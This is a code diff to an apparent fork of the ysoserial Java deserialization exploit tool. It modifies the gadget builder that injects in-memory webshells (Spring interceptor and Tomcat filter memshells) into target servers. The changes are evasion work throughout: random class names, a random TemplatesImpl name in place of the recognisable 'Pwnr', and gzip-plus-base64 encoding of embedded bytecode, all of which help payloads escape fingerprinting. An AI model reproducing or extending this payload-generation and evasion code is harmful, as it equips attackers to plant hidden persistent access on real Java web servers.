@@ -12,9 +12,11 @@ import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.commons.codec.binary.Base64;
+import org.apache.commons.lang.RandomStringUtils;
 import org.apache.wicket.util.file.Files;
 import ysoserial.payloads.templates.SpringInterceptorMemShell;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.Serializable;
 import java.lang.reflect.Array;
@@ -23,6 +25,7 @@ import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.zip.GZIPOutputStream;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
@@ -113,9 +116,10 @@ public class Gadgets {
         }
         if (myClass != null) {
             // CLASS:
+            ctClass = pool.get(myClass.getName());
+            ctClass.setSuperclass(superC);
+            // SpringInterceptorMemShell单独对待
             if (myClass.getName().contains("SpringInterceptorMemShell")) {
-                // memShellClazz
-                ctClass = pool.get(myClass.getName());
                 // 修改b64字节码
                 CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
                 String clazzName = "ysoserial.payloads.templates.SpringInterceptorTemplate" + System.nanoTime();
@@ -127,22 +131,22 @@ public class Gadgets {
                 String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                 ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                 ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
-                ctClass.setSuperclass(superC);
                 classBytes = ctClass.toBytecode();
             } else {
-                classBytes = ClassFiles.classAsBytes(myClass);
+                // 其他的TomcatFilterMemShellFromThread这种可以直接加载 需要随机命名类名
+                ctClass.setName(myClass.getName() + System.nanoTime());
+                classBytes = ctClass.toBytecode();
             }
         }
         if (bytes != null) {
             // FILE:
             ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
             ctClass.setName(ctClass.getName() + System.nanoTime());
-            StringBuffer sb = new StringBuffer();
-            for (int i = 0; i < bytes.length; i++) {
-                sb.append(bytes[i]);
-                if (i != bytes.length - 1) sb.append(",");
-            }
-            String content = "bs = new byte[]{" + sb + "};";
+            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
+            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
+            gzipOutputStream.write(bytes);
+            gzipOutputStream.close();
+            String content = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
             // System.out.println(content);
             ctClass.makeClassInitializer().insertBefore(content);
             ctClass.setSuperclass(superC);
@@ -154,7 +158,7 @@ public class Gadgets {
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Foo.class)});
 
         // required to make TemplatesImpl happy
-        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
